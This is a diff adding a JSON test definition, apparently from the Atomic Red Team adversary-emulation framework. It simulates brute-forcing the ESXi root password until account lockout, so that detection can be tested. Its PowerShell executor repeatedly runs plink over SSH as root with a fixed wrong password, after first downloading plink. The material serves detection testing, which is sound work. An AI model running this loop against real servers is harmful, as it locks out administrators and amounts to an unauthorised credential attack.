@@ -1,0 +1,47 @@
+{
+    "name": "ESXi - Brute Force Until Account Lockout",
+    "description": "An adversary may attempt to brute force the password of privilleged account for privilege escalation. In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n",
+        "name": "powershell",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1110.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Guessing",
+    "source": "ART",
+    "uuid": "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5",
+    "arguments": {
+        "vm_host": {
+            "description": "Specify the host name of the ESXi Server",
+            "type": "string",
+            "default": "atomic.local"
+        },
+        "plink_file": {
+            "description": "Path to Putty",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
+        },
+        "lockout_threshold": {
+            "description": "Specify the account lockout threshold configured on the ESXI management server",
+            "type": "string",
+            "default": "5"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The plink executable must be found in the ExternalPayloads folder.\n",
+            "prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
